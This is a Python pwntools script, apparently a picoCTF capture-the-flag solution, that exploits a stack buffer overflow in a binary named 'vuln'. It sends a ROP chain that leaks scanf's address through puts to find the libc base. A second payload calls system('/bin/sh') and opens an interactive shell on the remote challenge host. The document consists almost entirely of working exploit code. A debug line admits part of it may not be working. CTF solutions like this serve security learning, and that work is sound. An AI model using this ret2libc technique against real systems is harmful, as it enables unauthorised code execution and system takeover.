#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.terminal = ['tmux', 'splitw', "-h", '-F', '#{pane_pid}', '-P']
context.binary = exe

#################
### CONSTANTS ###
#################
OFFSET = 136
POP_RDI = 0x400913
RET = 0x40052e
#################


def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path])
    else:
        r = remote("mercury.picoctf.net", 62289)

    return r


def main():
    r = conn()

    # good luck pwning :)

    print(r.clean().decode("utf-8"))

    # find location of main func
    main_func = exe.symbols.main
    # find GOT and PLT locations
    puts_plt = exe.plt.puts
    scanf_got = exe.got.__isoc99_scanf
    info(str(exe.got))

    success(f"{hex(POP_RDI)=}")
    success(f"{hex(main_func)=}")
    success(f"{hex(puts_plt)=}")
    success(f"{hex(scanf_got)=}")

    junk = b"A" * OFFSET
    payload = [
        junk,
        p64(POP_RDI),
        p64(scanf_got),
        p64(puts_plt),
        p64(main_func),
    ]
    payload = b"".join(payload)

    print(r.recvuntil("!\n").decode("utf-8"))
    info("sending payload")
    r.sendline(payload)

    print(r.recvline().decode())
    leak = r.recvline()
    print(leak)
    scanf_leak = u64(leak.strip().ljust(8, b"\x00"))
    success(f"{hex(scanf_leak)=}")

    info("running for the second time")

    libc.address = scanf_leak - libc.symbols.__isoc99_scanf
    success(f"{hex(libc.address)=}")

    # search for /bin/sh
    bin_sh = libc.search(b"/bin/sh").__next__()
    success(f"{hex(bin_sh)=}")
    # find system address
    system_func = libc.symbols.system
    success(f"For some reason not working: {hex(system_func)=}")

    payload = [
        junk,
        p64(POP_RDI),
        p64(bin_sh),
        p64(RET),
        p64(system_func),
    ]
    payload = b"".join(payload)
    print(r.recvuntil("!\n").decode("utf-8"))
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
